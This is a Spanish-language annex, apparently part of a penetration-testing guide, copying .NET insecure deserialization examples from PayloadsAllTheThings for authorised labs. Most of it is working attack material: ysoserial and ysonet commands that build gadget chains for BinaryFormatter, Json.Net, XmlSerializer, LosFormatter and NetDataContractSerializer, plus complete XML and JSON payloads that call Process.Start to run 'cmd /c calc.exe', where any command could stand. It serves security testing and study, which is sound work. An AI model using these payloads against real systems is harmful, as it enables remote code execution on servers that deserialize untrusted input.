# Deserialización insegura: anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [Insecure Deserialization/DotNET.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Insecure%20Deserialization/DotNET.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. .NET Deserialization / Detection

### Variantes presentes en tablas o texto del apartado

```text
/w
AAEAAAD/////AQAAAAAAAAAMAgAAAF9TeXN0ZW0u[...]0KPC9PYmpzPgs=
```

## 2. .NET Deserialization / Herramientas

```ps1
    cat my_long_cmd.txt | ysoserial.exe -o raw -g WindowsIdentity -f Json.Net -s
    ./ysoserial.exe -p DotNetNuke -m read_file -f win.ini
    ./ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc" -t
    ./ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c "calc" -t
```

```ps1
    cat my_long_cmd.txt | ysonet.exe -o raw -g WindowsIdentity -f Json.Net -s
    ./ysonet.exe -p DotNetNuke -m read_file -f win.ini
    ./ysonet.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc" -t
    ./ysonet.exe -f BinaryFormatter -g PSObject -o base64 -c "calc" -t
```

## 3. Formatters / XmlSerializer

```xml
.\ysoserial.exe -g ObjectDataProvider -f XmlSerializer -c "calc.exe"
<?xml version="1.0"?>
<root type="System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">
    <ExpandedWrapperOfXamlReaderObjectDataProvider xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" >
        <ExpandedElement/>
        <ProjectedProperty0>
            <MethodName>Parse</MethodName>
            <MethodParameters>
                <anyType xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xsi:type="xsd:string">
                    <![CDATA[<ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:d="http://schemas.microsoft.com/winfx/2006/xaml" xmlns:b="clr-namespace:System;assembly=mscorlib" xmlns:c="clr-namespace:System.Diagnostics;assembly=system"><ObjectDataProvider d:Key="" ObjectType="{d:Type c:Process}" MethodName="Start"><ObjectDataProvider.MethodParameters><b:String>cmd</b:String><b:String>/c calc.exe</b:String></ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>]]>
                </anyType>
            </MethodParameters>
            <ObjectInstance xsi:type="XamlReader"></ObjectInstance>
        </ProjectedProperty0>
    </ExpandedWrapperOfXamlReaderObjectDataProvider>
</root>
```

### Variantes presentes en tablas o texto del apartado

```text
XmlSerializer(typeof(<TYPE>));
```

## 4. Formatters / DataContractSerializer

### Variantes presentes en tablas o texto del apartado

```text
DataContractSerializer(typeof(<TYPE>))
```

## 5. Formatters / NetDataContractSerializer

```ps1
.\ysoserial.exe -f NetDataContractSerializer -g TypeConfuseDelegate -c "calc.exe" -o base64 -t
```

### Variantes presentes en tablas o texto del apartado

```text
System.Runtime.Serialization.XmlObjectSerializer
NetDataContractSerializer().ReadObject()
```

## 6. Formatters / LosFormatter

```ps1
.\ysoserial.exe -f LosFormatter -g TypeConfuseDelegate -c "calc.exe" -o base64 -t
```

## 7. Formatters / JSON.NET

```ps1
.\ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc.exe" -t
{
    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35', 
    'MethodName':'Start',
    'MethodParameters':{
        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        '$values':['cmd', '/c calc.exe']
    },
    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}
```

### Variantes presentes en tablas o texto del apartado

```text
JsonConvert.DeserializeObject<Expected>(json, new JsonSerializerSettings
```

## 8. Formatters / BinaryFormatter

```ps1
./ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c "calc" -t
```

### Variantes presentes en tablas o texto del apartado

```text
System.Runtime.Serialization.Binary.BinaryFormatter
[Serializable]
```

## 9. .NET Deserialization / POP Gadgets

```cs
    ExpandedWrapper<Process, ObjectDataProvider> myExpWrap = new ExpandedWrapper<Process, ObjectDataProvider>();
```

```cs
    // System.Configuration.Install.AssemblyInstaller
    public void set_Path(string value){
        if (value == null){
            this.assembly = null;
        }
        this.assembly = Assembly.LoadFrom(value);
    }
```

### Variantes presentes en tablas o texto del apartado

```text
C:\Windows\Microsoft.NET\Framework\v4.0.30319\WPF\PresentationFramework.dll
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
